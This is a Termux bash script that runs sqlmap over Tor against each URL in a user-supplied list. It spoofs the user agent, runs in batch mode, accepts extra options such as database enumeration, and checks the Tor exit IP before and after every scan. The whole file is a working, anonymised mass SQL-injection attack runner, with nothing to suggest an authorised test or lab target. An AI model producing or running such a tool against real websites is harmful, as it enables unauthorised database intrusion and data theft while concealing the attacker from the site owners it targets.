#!/data/data/com.termux/files/usr/bin/bash

# Colors
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
RESET="\033[0m"

echo -e "${GREEN}🛡️  SQLMap via Tor Auto-Runner with URL List + IP Check + Logging${RESET}"

# Check if Tor is running
if ! pgrep -x tor > /dev/null; then
    echo -e "${YELLOW}[+] Starting Tor service...${RESET}"
    tor & sleep 5
else
    echo -e "${GREEN}[✓] Tor is already running${RESET}"
fi

# Ask for URL list file
read -p "📁 Enter path to URL list file (one URL per line): " url_file
if [[ ! -f "$url_file" ]]; then
    echo -e "${RED}[!] File not found: $url_file${RESET}"
    exit 1
fi

# Ask for additional SQLMap options (optional)
read -p "⚙️  Enter extra SQLMap options (e.g. --dbs --current-user), or press Enter to skip: " extra_options

# Get Tor IP before scan
echo -ne "➡️  Tor IP before scan: "
tor_ip_before=$(torsocks curl -s https://ifconfig.me)
echo -e "${BLUE}$tor_ip_before${RESET}"

mkdir -p logs

count=0
total=$(grep -cve '^\s*$' "$url_file")  # total non-empty lines

# Loop through URLs
while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    count=$((count + 1))

    echo -e "\n${YELLOW}[${count}/${total}]🔍 Target: ${url}${RESET}"

    # Extract domain for log filename
    log_name=$(echo "$url" | sed 's|https\?://||; s|[/?=&]|_|g')
    log_file="logs/${log_name}.log"

    echo -e "${BLUE}🚀 Launching SQLMap...${RESET}"
    torsocks python3 sqlmap/sqlmap.py -u "$url" \
        --random-agent \
        --delay=3 \
        --timeout=30 \
        --retries=2 \
        --batch \
        $extra_options | tee "$log_file"

    echo -ne "${YELLOW}📋 Status: ${RESET}"
    if grep -q "\[INFO\] testing" "$log_file"; then
        echo -e "${GREEN}✓ SQLMap executed${RESET}"
    else
        echo -e "${RED}✗ No SQLMap activity detected${RESET}"
    fi

    # Tor IP after each scan
    echo -ne "⬅️  Tor IP after scan: "
    tor_ip_after=$(torsocks curl -s https://ifconfig.me)
    echo -e "${BLUE}$tor_ip_after${RESET}"

    echo -e "📝 Log saved to: ${log_file}"
    echo "----------------------------------------------"

done < "$url_file"
